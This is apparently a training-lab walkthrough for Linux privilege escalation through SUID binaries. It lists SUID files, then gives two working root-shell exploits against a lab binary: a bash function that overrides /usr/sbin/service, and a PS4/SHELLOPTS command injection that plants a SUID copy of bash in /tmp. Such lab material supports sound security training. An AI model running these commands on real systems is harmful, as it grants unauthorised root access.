Detection Linux VM

In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null

From the output, make note of all the SUID binaries.

In command prompt type: strings /usr/local/bin/suid-env

From the output, notice the functions used by the binary.

Exploitation Method #1 Linux VM

In command prompt type:
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }

In command prompt type: export -f /usr/sbin/service

In command prompt type: /usr/local/bin/suid-env2

Exploitation Method #2 Linux VM

1. In command prompt type:
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' 
